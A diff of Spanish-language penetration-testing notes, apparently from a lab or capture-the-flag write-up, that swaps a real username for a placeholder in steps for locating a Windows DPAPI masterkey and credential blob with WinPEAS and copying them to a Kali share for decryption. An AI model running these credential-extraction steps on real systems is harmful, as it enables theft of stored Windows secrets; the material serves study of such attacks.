@@ -21,7 +21,7 @@ Lo enumeras con WinPEAS.
 ```powershell 
 Paso 1:
 # Obtener la Masterkey desde WinPEAS
-❯ C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
+❯ C:\Users\<user>\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
 
 	# sid = S-1-5-21-1487982659-1829050783-2281216199-1107
 Es un archivo con ese nombre el cual se puede renombrar asi:
@@ -29,7 +29,7 @@ Es un archivo con ese nombre el cual se puede renombrar asi:
 
 Paso 2:
 # Obtener la ruta de los 'CredFile' desde WinPEAS
-❯ C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
+❯ C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
 
 Es un archivo con ese nombre el cual se puede renombrar asi:
 	# credential_blob = C8D69EBE9A43E9DEBF6B5FBD48B521B9
@@ -38,9 +38,9 @@ Es un archivo con ese nombre el cual se puede renombrar asi:
 ```bash 
 Paso 3:
 # Descargar los archivos a Kali renombrados 
-❯ copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 x:\masterkey_blob
+❯ copy C:\Users\<user>\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 x:\masterkey_blob
 
-❯ copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 x:\credential_blob
+❯ copy C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 x:\credential_blob
 ```
 
 ```bash 
